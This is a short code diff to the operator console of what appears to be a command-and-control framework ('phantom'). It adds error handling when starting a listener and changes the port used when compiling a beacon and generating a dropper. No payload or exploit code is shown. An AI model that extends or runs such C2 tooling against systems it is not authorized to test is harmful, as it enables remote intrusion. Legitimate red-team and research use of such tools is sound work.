@@ -56,10 +56,13 @@ class C2Shell(cmd.Cmd):
 
         action = parts[0]
         if action == "start":
-            port = int(parts[1]) if len(parts) > 1 else (session.lport or 443)
-            host = parts[2] if len(parts) > 2 else (session.lhost or "0.0.0.0")
-            server_instance.start(host=host, port=port)
-            notifier.success(f"Started listener on {host}:{port}")
+            try:
+                port = int(parts[1]) if len(parts) > 1 else (session.lport or 443)
+                host = parts[2] if len(parts) > 2 else (session.lhost or "0.0.0.0")
+                server_instance.start(host=host, port=port)
+                notifier.success(f"Started listener on {host}:{port}")
+            except Exception as e:
+                notifier.error(f"Failed to start listener: {e}")
         elif action == "stop":
             server_instance.stop()
             notifier.success("Stopped listener")
@@ -197,7 +200,7 @@ class C2Shell(cmd.Cmd):
         import phantom
         pkg_root = os.path.dirname(phantom.__file__)
         host = get_lhost()
-        port = server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443
+        port = int(session.lport) if session.lport else (server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443)
 
         # Compile and generate dropper
         beacon_path = compile_beacon(platform, pkg_root)
